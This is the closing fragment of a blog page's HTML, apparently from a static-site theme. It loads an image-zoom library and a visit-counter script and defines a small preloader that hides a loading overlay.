src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>